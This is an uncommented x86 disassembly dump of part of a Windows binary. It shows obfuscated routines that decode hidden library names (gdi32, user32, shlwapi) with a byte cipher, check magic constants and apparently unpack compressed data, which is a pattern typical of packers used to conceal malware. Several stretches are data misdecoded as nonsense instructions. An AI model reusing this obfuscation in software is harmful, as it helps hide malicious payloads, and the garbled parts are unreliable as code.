  41f7fc:	lds    ebp,FWORD PTR [edi+0x3103eb04]
  41f802:	push   esp
  41f803:	push   ds
  41f804:	xor    al,0xe5
  41f807:	(bad)  
  41f808:	fisub  WORD PTR [edi-0x79]
  41f80b:	cmp    dl,al
  41f80d:	jmp    0x491de818
  41f812:	in     al,0xc2
  41f814:	lods   eax,DWORD PTR ds:[esi]
  41f815:	pop    esi
  41f816:	aas    
  41f817:	lahf   
  41f818:	cwde   
  41f819:	pusha  
  41f81a:	test   BYTE PTR [ebx+0x398d02cc],bh
  41f820:	and    BYTE PTR [edi],bh
  41f822:	pop    eax
  41f823:	stc    
  41f824:	fisttp QWORD PTR [ecx-0x74]
  41f827:	outs   dx,DWORD PTR ds:[esi]
  41f828:	mov    bl,0x75
  41f82a:	add    BYTE PTR [ecx],ah
  41f82c:	pop    esp
  41f82d:	adc    DWORD PTR [ebx-0x76],eax
  41f830:	and    dh,cl
  41f832:	sti    
  41f833:	push   0x50
  41f835:	dec    ecx
  41f836:	sti    
  41f837:	mov    bl,0x8
  41f839:	popf   
  41f83a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f83b:	push   ss
  41f83c:	inc    eax
  41f83d:	sbb    eax,0xa66a5917
  41f842:	adc    dh,cl
  41f844:	(bad)  
  41f845:	mov    eax,ds:0x4efe1930
  41f84a:	rcl    BYTE PTR [ebp+0xaf72ff9],cl
  41f850:	xchg   esp,eax
  41f851:	cld    
  41f852:	xor    dh,BYTE PTR [ecx-0x6eb4aec7]
  41f858:	push   cs
  41f859:	mov    edx,DWORD PTR [ebp-0x53842d8d]
  41f85f:	loop   0x41f8cb
  41f861:	les    ebp,FWORD PTR [edi-0x38e65d85]
  41f867:	dec    ebx
  41f868:	mov    WORD PTR ds:0x18bd5329,?
  41f86e:	adc    eax,0xd1142087
  41f873:	sbb    BYTE PTR [eax],ch
  41f875:	mov    edx,0x3272fa
  41f87a:	sub    eax,edx
  41f87c:	or     ecx,DWORD PTR ds:0x426eb9
  41f882:	mov    ecx,0x75108b3
  41f887:	or     DWORD PTR ds:0x426e85,0x426eb1
  41f891:	xor    eax,ecx
  41f893:	cmp    eax,0xf89c85e0
  41f898:	jne    0x41f8d1
  41f89e:	mov    eax,DWORD PTR [ebp+0x8]
  41f8a1:	sbb    DWORD PTR ds:0x426ef1,0x426f1d
  41f8ab:	push   esi
  41f8ac:	mov    esi,DWORD PTR [ebp+0x8]
  41f8af:	add    esi,DWORD PTR [eax+0x3c]
  41f8b2:	mov    DWORD PTR [ebp+0x8],esi
  41f8b5:	mov    eax,DWORD PTR [ebp-0x4]
  41f8b8:	mov    esi,DWORD PTR [ebp+0x8]
  41f8bb:	xor    eax,ecx
  41f8bd:	add    eax,edx
  41f8bf:	cmp    DWORD PTR [esi+0x54],eax
  41f8c2:	pop    esi
  41f8c3:	je     0x41f8d1
  41f8c9:	mov    eax,DWORD PTR [ebp+0x8]
  41f8cc:	jmp    0x41f8d8
  41f8d1:	mov    eax,DWORD PTR [ebp-0x4]
  41f8d4:	xor    eax,ecx
  41f8d6:	add    eax,edx
  41f8d8:	leave  
  41f8d9:	ret    0x4
  41f8dc:	push   ebp
  41f8dd:	mov    ebp,esp
  41f8df:	sub    esp,0xc
  41f8e2:	push   esi
  41f8e3:	mov    esi,DWORD PTR ds:0x429d65
  41f8e9:	mov    edx,DWORD PTR ds:0x42af5d
  41f8ef:	sub    edx,esi
  41f8f1:	or     esi,DWORD PTR [esi+edx*1]
  41f8f4:	mov    eax,0xf89c85b5
  41f8f9:	adc    DWORD PTR ds:0x426ed9,edx
  41f8ff:	mov    DWORD PTR [ebp-0x8],eax
  41f902:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  41f909:	sub    DWORD PTR ds:0x426ef9,0x356c
  41f913:	mov    esi,DWORD PTR [ebp-0x4]
  41f916:	add    DWORD PTR ds:0x426eed,0x182c
  41f920:	push   edi
  41f921:	mov    edi,DWORD PTR [ebp-0x8]
  41f924:	or     ecx,edx
  41f926:	mov    ecx,0x75108b3
  41f92b:	sub    DWORD PTR ds:0x426ed1,edi
  41f931:	xor    esi,ecx
  41f933:	and    DWORD PTR ds:0x426eb1,0x0
  41f93d:	mov    edx,DWORD PTR ds:0x426eb1
  41f943:	inc    edx
  41f944:	mov    DWORD PTR ds:0x426eb1,edx
  41f94a:	cmp    DWORD PTR ds:0x426eb1,0x1e
  41f951:	jle    0x41f96f
  41f957:	jmp    0x41f962
  41f95c:	call   DWORD PTR ds:0x430a00
  41f962:	cmp    DWORD PTR ds:0x426eb1,0x19
  41f969:	jb     0x41f93d
  41f96f:	xor    edi,ecx
  41f971:	and    DWORD PTR ds:0x426e99,0x0
  41f97b:	jmp    0x41f98d
  41f980:	mov    edx,DWORD PTR ds:0x426e99
  41f986:	inc    edx
  41f987:	mov    DWORD PTR ds:0x426e99,edx
  41f98d:	cmp    DWORD PTR ds:0x426e99,0x12
  41f994:	jae    0x41f9eb
  41f99a:	cmp    DWORD PTR ds:0x426e99,0x4
  41f9a1:	ja     0x41f9eb
  41f9a7:	jmp    0x41f9cc
  41f9ac:	push   0x426efd
  41f9b1:	push   DWORD PTR [ebp-0x18]
  41f9b4:	push   DWORD PTR [ebp-0x14]
  41f9b7:	push   0x69eb
  41f9bc:	push   0x7974
  41f9c1:	push   0x5e98
  41f9c6:	call   DWORD PTR ds:0x430a40
  41f9cc:	cmp    DWORD PTR ds:0x426e99,0x3
  41f9d3:	jne    0x41f9e6
  41f9d9:	mov    edx,DWORD PTR ds:0x426e99
  41f9df:	inc    edx
  41f9e0:	mov    DWORD PTR ds:0x426e99,edx
  41f9e6:	jmp    0x41f980
  41f9eb:	mov    edx,0x3272fa
  41f9f0:	mov    DWORD PTR ds:0x426ef5,0xc6
  41f9fa:	add    edi,edx
  41f9fc:	add    esi,edx
  41f9fe:	imul   esi,edi
  41fa01:	mov    edi,DWORD PTR [ebp+0xc]
  41fa04:	cmp    edi,esi
  41fa06:	je     0x41fa5b
  41fa0c:	mov    DWORD PTR [ebp-0xc],eax
  41fa0f:	mov    eax,DWORD PTR [ebp-0xc]
  41fa12:	mov    esi,DWORD PTR [ebp+0xc]
  41fa15:	xor    eax,ecx
  41fa17:	lea    eax,[eax*8+0x1939848]
  41fa1e:	mov    eax,DWORD PTR [esi+eax*1]
  41fa21:	mov    DWORD PTR [ebp+0xc],eax
  41fa24:	mov    eax,DWORD PTR [ebp-0x4]
  41fa27:	mov    esi,DWORD PTR [ebp-0x8]
  41fa2a:	xor    eax,ecx
  41fa2c:	xor    esi,ecx
  41fa2e:	add    esi,edx
  41fa30:	add    eax,edx
  41fa32:	imul   eax,esi
  41fa35:	mov    esi,DWORD PTR [ebp+0xc]
  41fa38:	cmp    esi,eax
  41fa3a:	je     0x41fa5b
  41fa40:	mov    eax,DWORD PTR [ebp-0x4]
  41fa43:	xor    eax,ecx
  41fa45:	mov    ecx,DWORD PTR [ebp+0xc]
  41fa48:	add    eax,edx
  41fa4a:	imul   eax,ecx
  41fa4d:	add    eax,DWORD PTR [ebp+0x8]
  41fa50:	mov    DWORD PTR [ebp+0xc],eax
  41fa53:	mov    eax,DWORD PTR [ebp+0xc]
  41fa56:	jmp    0x41fa6c
  41fa5b:	mov    eax,DWORD PTR [ebp-0x4]
  41fa5e:	mov    esi,DWORD PTR [ebp-0x8]
  41fa61:	xor    esi,ecx
  41fa63:	xor    eax,ecx
  41fa65:	add    esi,edx
  41fa67:	add    eax,edx
  41fa69:	imul   eax,esi
  41fa6c:	pop    edi
  41fa6d:	pop    esi
  41fa6e:	leave  
  41fa6f:	ret    0x8
	...
  41fa82:	add    BYTE PTR [eax],al
  41fa84:	pop    ds
  41fa85:	sbb    esi,DWORD PTR [ebp+ecx*2+0x0]
  41fa89:	add    BYTE PTR [eax],al
  41fa8b:	add    BYTE PTR [edx],al
  41fa8d:	add    BYTE PTR [eax],al
  41fa8f:	add    BYTE PTR [ecx+0x0],al
  41fa92:	add    BYTE PTR [eax],al
  41fa94:	mov    al,ds:0xa00001fa
  41fa99:	out    dx,al
  41fa9a:	add    DWORD PTR [eax],eax
  41fa9c:	add    BYTE PTR [eax],al
  41fa9e:	add    BYTE PTR [eax],al
  41faa0:	push   edx
  41faa1:	push   ebx
  41faa2:	inc    esp
  41faa3:	push   ebx
  41faa4:	inc    eax
  41faa5:	cdq    
  41faa6:	not    BYTE PTR [edi+esi*4]
  41faa9:	ss daa 
  41faab:	inc    esp
  41faac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41faad:	ficom  DWORD PTR [edx]
  41faaf:	scas   eax,DWORD PTR es:[edi]
  41fab0:	mov    ch,BYTE PTR [eax+eiz*8]
  41fab3:	imul   eax,DWORD PTR [ecx],0x43000000
  41fab9:	cmp    bl,BYTE PTR [esi+eax*2+0x6f]
  41fabd:	ins    BYTE PTR es:[edi],dx
  41fabe:	fs gs jb 0x41fae2
  41fac2:	outs   dx,DWORD PTR ds:[esi]
  41fac3:	data16 and BYTE PTR [edi+0x6f],dl
  41fac7:	jb     0x41fb34
  41fac9:	imul   ebp,DWORD PTR [esi+0x67],0x6f725020
  41fad0:	push   0x65
  41fad2:	arpl   WORD PTR [esp+ebx*2+0x50],si
  41fad6:	jb     0x41fb47
  41fad8:	push   0x65
  41fada:	arpl   WORD PTR [esp+edx*2+0x65],si
  41fade:	jae    0x41fb54
  41fae0:	add    BYTE PTR [ebx-0x137e13ab],cl
  41fae6:	or     BYTE PTR [ecx],al
  41fae8:	add    BYTE PTR [eax],al
  41faea:	push   ebx
  41faeb:	mov    eax,ebx
  41faed:	xchg   ecx,eax
  41faee:	mov    eax,DWORD PTR [ebp+0x8]
  41faf1:	cmp    eax,0xf89c85b5
  41faf6:	jne    0x41ff8a
  41fafc:	mov    eax,DWORD PTR [ebp+0xc]
  41faff:	cmp    eax,0xf89c85b4
  41fb04:	jne    0x41ff8a
  41fb0a:	mov    eax,DWORD PTR [ebp+0x24]
  41fb0d:	mov    DWORD PTR [ebp-0x4],eax
  41fb10:	mov    eax,DWORD PTR [ebp-0x4]
  41fb13:	mov    eax,DWORD PTR [eax+0x1d8]
  41fb19:	mov    eax,DWORD PTR [eax]
  41fb1b:	mov    eax,DWORD PTR [eax]
  41fb1d:	mov    DWORD PTR [ebp-0x8],eax
  41fb20:	mov    BYTE PTR [ebp-0x18],0xe0
  41fb24:	mov    BYTE PTR [ebp-0x17],0xdf
  41fb28:	mov    BYTE PTR [ebp-0x16],0xe2
  41fb2c:	mov    BYTE PTR [ebp-0x15],0xac
  41fb30:	mov    BYTE PTR [ebp-0x14],0xad
  41fb34:	mov    BYTE PTR [ebp-0x13],0x7b
  41fb38:	mov    BYTE PTR [ebp-0x20],0xee
  41fb3c:	mov    BYTE PTR [ebp-0x1f],0xec
  41fb40:	mov    BYTE PTR [ebp-0x1e],0xde
  41fb44:	mov    BYTE PTR [ebp-0x1d],0xed
  41fb48:	mov    BYTE PTR [ebp-0x1c],0xac
  41fb4c:	mov    BYTE PTR [ebp-0x1b],0xad
  41fb50:	mov    BYTE PTR [ebp-0x1a],0x7b
  41fb54:	mov    BYTE PTR [ebp-0x28],0xec
  41fb58:	mov    BYTE PTR [ebp-0x27],0xe3
  41fb5c:	mov    BYTE PTR [ebp-0x26],0xe7
  41fb60:	mov    BYTE PTR [ebp-0x25],0xf0
  41fb64:	mov    BYTE PTR [ebp-0x24],0xda
  41fb68:	mov    BYTE PTR [ebp-0x23],0xeb
  41fb6c:	mov    BYTE PTR [ebp-0x22],0xe2
  41fb70:	mov    BYTE PTR [ebp-0x21],0x7b
  41fb74:	xor    ecx,ecx
  41fb76:	lea    eax,[ebp+ecx*1-0x18]
  41fb7a:	movzx  edx,BYTE PTR [eax]
  41fb7d:	xor    edx,0x81
  41fb83:	add    edx,0x6
  41fb86:	inc    ecx
  41fb87:	mov    BYTE PTR [eax],dl
  41fb89:	cmp    ecx,0x6
  41fb8c:	jb     0x41fb76
  41fb8e:	xor    ecx,ecx
  41fb90:	lea    eax,[ebp+ecx*1-0x20]
  41fb94:	movzx  edx,BYTE PTR [eax]
  41fb97:	xor    edx,0x81
  41fb9d:	add    edx,0x6
  41fba0:	inc    ecx
  41fba1:	mov    BYTE PTR [eax],dl
  41fba3:	cmp    ecx,0x7
  41fba6:	jb     0x41fb90
  41fba8:	xor    ecx,ecx
  41fbaa:	lea    eax,[ebp+ecx*1-0x28]
  41fbae:	movzx  edx,BYTE PTR [eax]
  41fbb1:	xor    edx,0x81
  41fbb7:	add    edx,0x6
  41fbba:	inc    ecx
  41fbbb:	mov    BYTE PTR [eax],dl
  41fbbd:	cmp    ecx,0x8
  41fbc0:	jb     0x41fbaa
  41fbc2:	lea    eax,[ebp-0x2c]
  41fbc5:	mov    DWORD PTR [ebp-0x8],eax
  41fbc8:	mov    ecx,DWORD PTR [ebp-0x8]
  41fbcb:	mov    eax,0x7113fcef
  41fbd0:	push   esi
  41fbd1:	mov    DWORD PTR [ecx],eax
  41fbd3:	mov    ecx,DWORD PTR [ebp-0x2c]
  41fbd6:	mov    esi,0x4e3c
  41fbdb:	push   edi
  41fbdc:	lea    edi,[esi-0x2]
  41fbdf:	mov    ebx,0x3272fa
  41fbe4:	cmp    ecx,eax
  41fbe6:	jne    0x41fcb7
  41fbec:	lea    eax,[esi+0x3b]
  41fbef:	mov    WORD PTR [ebp-0x78],ax
  41fbf3:	mov    eax,esi
  41fbf5:	mov    WORD PTR [ebp-0x76],ax
  41fbf9:	add    eax,0x3d
  41fbfc:	mov    WORD PTR [ebp-0x74],ax
  41fc00:	lea    eax,[esi+0x2]
  41fc03:	mov    WORD PTR [ebp-0x72],ax
  41fc07:	add    eax,0x41
  41fc0a:	mov    WORD PTR [ebp-0x70],ax
  41fc0e:	mov    eax,edi
  41fc10:	mov    WORD PTR [ebp-0x6e],ax
  41fc14:	mov    eax,0x4f90
  41fc19:	mov    WORD PTR [ebp-0x6c],ax
  41fc1d:	lea    eax,[esi-0x7]
  41fc20:	mov    WORD PTR [ebp-0x6a],ax
  41fc24:	add    eax,0x30
  41fc27:	mov    WORD PTR [ebp-0x68],ax
  41fc2b:	lea    eax,[esi-0xb]
  41fc2e:	mov    WORD PTR [ebp-0x66],ax
  41fc32:	mov    eax,esi
  41fc34:	mov    WORD PTR [ebp-0x64],ax
  41fc38:	add    eax,0xfffffff4
  41fc3b:	mov    WORD PTR [ebp-0x62],ax
  41fc3f:	mov    eax,0x44b
  41fc44:	mov    WORD PTR [ebp-0x60],ax
  41fc48:	mov    eax,0x567a
  41fc4d:	mov    WORD PTR [ebp-0x5e],ax
  41fc51:	mov    eax,0x611a
  41fc56:	mov    WORD PTR [ebp-0x5c],ax
  41fc5a:	mov    eax,0xf1e4
  41fc5f:	mov    WORD PTR [ebp-0x5a],ax
  41fc63:	mov    eax,edi
  41fc65:	mov    WORD PTR [ebp-0x58],ax
  41fc69:	lea    eax,[ebp-0xe0]
  41fc6f:	push   eax
  41fc70:	mov    eax,DWORD PTR [ebp+0xc]
  41fc73:	xor    eax,0x75108b3
  41fc78:	add    eax,ebx
  41fc7a:	push   eax
  41fc7b:	lea    eax,[ebp-0x78]
  41fc7e:	push   eax
  41fc7f:	mov    eax,DWORD PTR [ebp-0x4]
  41fc82:	mov    eax,DWORD PTR [eax+0x198]
  41fc88:	mov    DWORD PTR [ebp-0xe0],0x1
  41fc92:	mov    DWORD PTR [ebp-0xdc],0xffff
  41fc9c:	push   DWORD PTR [eax]
  41fc9e:	mov    eax,DWORD PTR [ebp+0x10]
  41fca1:	call   eax
  41fca3:	mov    DWORD PTR [ebp-0x8],eax
  41fca6:	mov    eax,DWORD PTR [ebp-0x8]
  41fca9:	test   eax,eax
  41fcab:	je     0x41fcb7
  41fcad:	xor    DWORD PTR ds:0xe041cd9,0x9f170bc8
  41fcb7:	mov    eax,DWORD PTR [ebp-0x4]
  41fcba:	mov    ecx,DWORD PTR [eax+0x18c]
  41fcc0:	xor    eax,eax
  41fcc2:	cmp    DWORD PTR [ecx],eax
  41fcc4:	jne    0x41fefa
  41fcca:	mov    ecx,DWORD PTR [ebp-0x4]
  41fccd:	mov    ecx,DWORD PTR [ecx+0x17c]
  41fcd3:	mov    DWORD PTR [ecx],eax
  41fcd5:	mov    ecx,DWORD PTR [ebp-0x4]
  41fcd8:	mov    ecx,DWORD PTR [ecx+0x180]
  41fcde:	mov    DWORD PTR [ecx],eax
  41fce0:	mov    eax,0x4e69
  41fce5:	mov    WORD PTR [ebp-0x9c],ax
  41fcec:	mov    eax,esi
  41fcee:	mov    WORD PTR [ebp-0x9a],ax
  41fcf5:	mov    eax,0x4e79
  41fcfa:	mov    WORD PTR [ebp-0x98],ax
  41fd01:	add    eax,0xffffffc0
  41fd04:	mov    WORD PTR [ebp-0x96],ax
  41fd0b:	mov    eax,0x4f8c
  41fd10:	mov    WORD PTR [ebp-0x94],ax
  41fd17:	mov    eax,0x4e38
  41fd1c:	mov    WORD PTR [ebp-0x92],ax
  41fd23:	mov    eax,esi
  41fd25:	mov    WORD PTR [ebp-0x8c],ax
  41fd2c:	mov    eax,0x4e35
  41fd31:	mov    WORD PTR [ebp-0x8a],ax
  41fd38:	mov    eax,0x99f9
  41fd3d:	mov    WORD PTR [ebp-0x88],ax
  41fd44:	mov    eax,0x8d68
  41fd49:	mov    WORD PTR [ebp-0x86],ax
  41fd50:	mov    eax,0xd66f
  41fd55:	mov    WORD PTR [ebp-0x84],ax
  41fd5c:	mov    BYTE PTR [ebp-0x10],0xec
  41fd60:	mov    eax,0xd78b
  41fd65:	mov    WORD PTR [ebp-0x82],ax
  41fd6c:	mov    BYTE PTR [ebp-0xf],0xe3
  41fd70:	mov    eax,0x278a
  41fd75:	mov    BYTE PTR [ebp-0xe],0xe7
  41fd79:	mov    WORD PTR [ebp-0x80],ax
  41fd7d:	mov    BYTE PTR [ebp-0xd],0xf0
  41fd81:	mov    eax,0x478a
  41fd86:	mov    BYTE PTR [ebp-0xc],0xda
  41fd8a:	mov    WORD PTR [ebp-0x7e],ax
  41fd8e:	mov    eax,0x4e3b
  41fd93:	mov    BYTE PTR [ebp-0xb],0xeb
  41fd97:	push   0x8
  41fd99:	mov    BYTE PTR [ebp-0xa],0xe2
  41fd9d:	mov    WORD PTR [ebp-0x7c],ax
  41fda1:	mov    BYTE PTR [ebp-0x9],0x7b
  41fda5:	mov    DWORD PTR [ebp-0x90],0x4e3a4e65
  41fdaf:	lea    eax,[ebp-0x10]
  41fdb2:	pop    edi
  41fdb3:	movzx  ecx,BYTE PTR [eax]
  41fdb6:	xor    ecx,0x81
  41fdbc:	add    ecx,0x6
  41fdbf:	mov    BYTE PTR [eax],cl
  41fdc1:	inc    eax
  41fdc2:	dec    edi
  41fdc3:	jne    0x41fdb3
  41fdc5:	mov    DWORD PTR [ebp-0xe0],0x1
  41fdcf:	lea    eax,[ebp-0x10]
  41fdd2:	mov    DWORD PTR [ebp-0xdc],eax
  41fdd8:	mov    ecx,0x4e64
  41fddd:	mov    eax,ecx
  41fddf:	mov    WORD PTR [ebp-0x40],ax
  41fde3:	add    eax,0xf
  41fde6:	mov    edx,eax
  41fde8:	mov    WORD PTR [ebp-0x3e],dx
  41fdec:	mov    edx,0x4f9b
  41fdf1:	mov    WORD PTR [ebp-0x3c],dx
  41fdf5:	add    edx,0xfffffff8
  41fdf8:	mov    WORD PTR [ebp-0x3a],dx
  41fdfc:	mov    edx,0x4f8d
  41fe01:	mov    WORD PTR [ebp-0x38],dx
  41fe05:	inc    edx
  41fe06:	mov    WORD PTR [ebp-0x36],dx
  41fe0a:	mov    edx,0x4f87
  41fe0f:	mov    WORD PTR [ebp-0x34],dx
  41fe13:	mov    WORD PTR [ebp-0x32],cx
  41fe17:	mov    ecx,esi
  41fe19:	mov    WORD PTR [ebp-0x30],cx
  41fe1d:	lea    ecx,[edx-0x3]
  41fe20:	mov    edx,ecx
  41fe22:	mov    WORD PTR [ebp-0x54],dx
  41fe26:	mov    edx,eax
  41fe28:	mov    WORD PTR [ebp-0x52],dx
  41fe2c:	mov    edx,0x4e7b
  41fe31:	mov    WORD PTR [ebp-0x50],dx
  41fe35:	mov    WORD PTR [ebp-0x4e],ax
  41fe39:	lea    eax,[edx-0xe]
  41fe3c:	mov    WORD PTR [ebp-0x4c],ax
  41fe40:	inc    eax
  41fe41:	mov    WORD PTR [ebp-0x4a],ax
  41fe45:	lea    eax,[edx-0x14]
  41fe48:	mov    WORD PTR [ebp-0x48],ax
  41fe4c:	mov    WORD PTR [ebp-0x46],cx
  41fe50:	mov    WORD PTR [ebp-0x44],si
  41fe54:	mov    ecx,DWORD PTR [ebp+0x8]
  41fe57:	movzx  edx,WORD PTR [ebp-0x54]
  41fe5b:	mov    eax,0x75108b3
  41fe60:	xor    ecx,eax
  41fe62:	add    ecx,ebx
  41fe64:	xor    ecx,edx
  41fe66:	mov    WORD PTR [ebp-0x54],cx
  41fe6a:	mov    ecx,DWORD PTR [ebp+0x8]
  41fe6d:	xor    ecx,eax
  41fe6f:	movzx  eax,WORD PTR [ebp-0x40]
  41fe73:	add    ecx,ebx
  41fe75:	xor    ecx,eax
  41fe77:	xor    eax,eax
  41fe79:	mov    WORD PTR [ebp-0x40],cx
  41fe7d:	mov    WORD PTR [ebp-0xf4],ax
  41fe84:	mov    WORD PTR [ebp-0x108],ax
  41fe8b:	mov    edi,DWORD PTR [ebp+0x24]
  41fe8e:	lea    eax,[ebp-0xf4]
  41fe94:	lea    edx,[ebp-0x54]
  41fe97:	mov    DWORD PTR [ebp-0xe0],0x2
  41fea1:	mov    DWORD PTR [ebp-0xdc],eax
  41fea7:	call   0x4228e9
  41feac:	mov    ecx,DWORD PTR [ebp+0x8]
  41feaf:	mov    DWORD PTR [ebp-0xd8],eax
  41feb5:	mov    eax,0x75108b3
  41feba:	xor    ecx,eax
  41febc:	add    ecx,ebx
  41febe:	je     0x41fedd
  41fec0:	lea    ecx,[ebp-0xe0]
  41fec6:	push   ecx
  41fec7:	mov    ecx,DWORD PTR [ebp+0xc]
  41feca:	xor    ecx,eax
  41fecc:	add    ecx,ebx
  41fece:	push   ecx
  41fecf:	lea    eax,[ebp-0x9c]
  41fed5:	push   eax
  41fed6:	mov    eax,DWORD PTR [ebp+0x10]
  41fed9:	push   0x0
  41fedb:	call   eax
  41fedd:	mov    edi,DWORD PTR [ebp+0x24]
  41fee0:	lea    eax,[ebp-0x108]
  41fee6:	lea    edx,[ebp-0x40]
  41fee9:	mov    DWORD PTR [ebp-0xdc],eax
  41feef:	call   0x4228e9
  41fef4:	mov    DWORD PTR [ebp-0xd8],eax
  41fefa:	mov    eax,DWORD PTR [ebp+0x14]
  41fefd:	push   DWORD PTR [ebp-0x4]
  41ff00:	push   DWORD PTR [ebp+0x20]
  41ff03:	push   DWORD PTR [ebp+0x1c]
  41ff06:	push   DWORD PTR [ebp+0x18]
  41ff09:	push   DWORD PTR [ebp+0x10]
  41ff0c:	push   DWORD PTR [ebp+0x8]
  41ff0f:	push   DWORD PTR [ebp+0xc]
  41ff12:	call   0x42118a
  41ff17:	test   eax,eax
  41ff19:	je     0x41ff60
  41ff1b:	add    DWORD PTR [ebp-0x4],eax
  41ff1e:	push   DWORD PTR [ebp-0x4]
  41ff21:	lea    esi,[ebp+0x4]
  41ff24:	call   0x420378
  41ff29:	mov    eax,DWORD PTR [ebp-0x4]
  41ff2c:	mov    eax,DWORD PTR [eax+0x1c8]
  41ff32:	mov    eax,DWORD PTR [eax]
  41ff34:	xor    eax,0x75108b3
  41ff39:	add    eax,ebx
  41ff3b:	mov    eax,DWORD PTR [ebp-0x4]
  41ff3e:	jne    0x41ff56
  41ff40:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff43:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41ff49:	push   DWORD PTR [ecx]
  41ff4b:	mov    eax,DWORD PTR [eax+0x1e0]
  41ff51:	call   DWORD PTR [eax+0x28]
  41ff54:	jmp    0x41ff60
  41ff56:	mov    eax,DWORD PTR [eax+0x17c]
  41ff5c:	mov    eax,DWORD PTR [eax]
  41ff5e:	add    DWORD PTR [esi],eax
  41ff60:	mov    eax,DWORD PTR [ebp-0x4]
  41ff63:	mov    eax,DWORD PTR [eax+0x1dc]
  41ff69:	dec    DWORD PTR [eax]
  41ff6b:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff6e:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41ff74:	mov    eax,DWORD PTR [eax]
  41ff76:	lea    eax,[ecx+eax*4]
  41ff79:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff7c:	mov    ecx,DWORD PTR [ecx+0x17c]
  41ff82:	mov    eax,DWORD PTR [eax]
  41ff84:	mov    ecx,DWORD PTR [ecx]
  41ff86:	add    DWORD PTR [eax],ecx
  41ff88:	pop    edi
  41ff89:	pop    esi
  41ff8a:	pop    ebx
  41ff8b:	leave  
  41ff8c:	ret    0x20
  41ff8f:	push   edi
  41ff90:	push   esi
  41ff91:	push   ebx
  41ff92:	push   ebp
  41ff93:	mov    ebp,esp
  41ff95:	mov    eax,DWORD PTR [ebp+0x24]
  41ff98:	add    DWORD PTR [ebp+0x28],eax
  41ff9b:	push   eax
  41ff9c:	cld    
  41ff9d:	mov    esi,DWORD PTR [ebp+0x18]
  41ffa0:	add    DWORD PTR [ebp+0x1c],esi
  41ffa3:	push   esi
  41ffa4:	mov    esi,DWORD PTR [ebp+0x14]
  41ffa7:	lods   eax,DWORD PTR ds:[esi]
  41ffa8:	xchg   edx,eax
  41ffa9:	push   edx
  41ffaa:	mov    cl,BYTE PTR [esi-0x2]
  41ffad:	or     eax,0xffffffff
  41ffb0:	shl    eax,cl
  41ffb2:	not    eax
  41ffb4:	push   eax
  41ffb5:	mov    cl,dh
  41ffb7:	or     eax,0xffffffff
  41ffba:	shl    eax,cl
  41ffbc:	not    eax
  41ffbe:	push   eax
  41ffbf:	add    cl,dl
  41ffc1:	mov    edi,esi
  41ffc3:	sub    esp,0xc
  41ffc6:	sub    eax,eax
  41ffc8:	inc    eax
  41ffc9:	push   eax
  41ffca:	push   eax
  41ffcb:	push   eax
  41ffcc:	push   eax
  41ffcd:	push   eax
  41ffce:	push   edi
  41ffcf:	sub    esi,esi
  41ffd1:	push   esi
  41ffd2:	or     ebx,0xffffffff
  41ffd5:	mov    eax,0x300
  41ffda:	shl    eax,cl
  41ffdc:	lea    ecx,[eax+0x736]
  41ffe2:	mov    eax,0x4000400
  41ffe7:	shr    ecx,1
  41ffe9:	rep stos DWORD PTR es:[edi],eax
  41ffeb:	push   0x5
  41ffed:	pop    ecx
  41ffee:	call   0x4202d9
  41fff3:	loop   0x41ffee
  41fff5:	lea    esi,[esi]
  41fff7:	lea    edi,[edi]
  41fff9:	mov    edi,DWORD PTR [ebp-0x4]
  41fffc:	mov    eax,DWORD PTR [ebp-0x10]
  41ffff:	sub    edi,DWORD PTR [ebp+0x24]
  420002:	and    eax,edi
  420004:	mov    DWORD PTR [ebp-0x18],eax
  420007:	mov    al,0x0
  420009:	call   0x4202f1
  42000e:	jne    0x4200a9
  420014:	mov    cl,BYTE PTR [ebp-0xc]
  420017:	and    edi,DWORD PTR [ebp-0x14]
  42001a:	shl    edi,cl
  42001c:	sub    cl,0x8
  42001f:	neg    cl
  420021:	shr    esi,cl
  420023:	pop    eax
  420024:	add    edi,esi
  420026:	pop    esi
  420027:	lea    edi,[edi+edi*2]
  42002a:	shl    edi,0x8
  42002d:	cmp    al,0x7
  42002f:	pop    edx
  420030:	lea    ecx,[esi+edi*2+0xe6c]
  420037:	push   ecx
  420038:	push   esi
  420039:	mov    esi,0x100
  42003e:	push   eax
  42003f:	mov    al,0x1
  420041:	jb     0x420077
  420043:	mov    edi,DWORD PTR [ebp-0x4]
  420046:	sub    edi,DWORD PTR [ebp-0x24]
  420049:	movzx  edi,BYTE PTR [edi]
  42004c:	mov    ebp,DWORD PTR [ebp-0x34]
  42004f:	shl    edi,1
  420051:	mov    ecx,esi
  420053:	and    esi,edi
  420055:	add    ecx,esi
  420057:	lea    ebp,[ebp+ecx*2+0x0]
  42005b:	call   0x420310
  420060:	mov    ecx,eax
  420062:	shr    esi,0x8
  420065:	and    ecx,0x1
  420068:	cmp    esi,ecx
  42006a:	mov    esi,0x100
  42006f:	jne    0x42007f
  420071:	cmp    eax,esi
  420073:	jb     0x42004c
  420075:	jmp    0x42008b
  420077:	mov    ebp,DWORD PTR [ebp-0x34]
  42007a:	call   0x420310
  42007f:	inc    eax
  420080:	inc    esi
  420081:	sub    eax,0x1
  420084:	sub    esi,0x1
  420087:	cmp    eax,esi
  420089:	jb     0x420077
  42008b:	pop    edx
  42008c:	inc    edx
  42008d:	cmp    edx,0x5
  420090:	dec    edx
  420091:	mov    ecx,edx
  420093:	jb     0x4200a4
  420095:	inc    edx
  420096:	cmp    edx,0xb
  420099:	dec    edx
  42009a:	mov    cl,0x4
  42009c:	dec    cl
  42009e:	jb     0x4200a4
  4200a0:	mov    cl,0x7
  4200a2:	dec    cl
  4200a4:	sub    edx,ecx
  4200a6:	push   edx
  4200a7:	jmp    0x4200f8
  4200a9:	mov    al,0xc1
  4200ab:	dec    al
  4200ad:	call   0x420301
  4200b2:	jne    0x4200c8
  4200b4:	pop    eax
  4200b5:	pop    edi
  4200b6:	pop    edx
  4200b7:	pop    ecx
  4200b8:	pop    edx
  4200b9:	pop    ecx
  4200ba:	push   DWORD PTR [esp]
  4200bd:	push   ecx
  4200be:	push   edx
  4200bf:	mov    edx,0x664
  4200c4:	mov    cl,0x0
  4200c6:	jmp    0x42013b
  4200c8:	mov    al,0xcd
  4200ca:	dec    al
  4200cc:	call   0x420301
  4200d1:	jne    0x420101
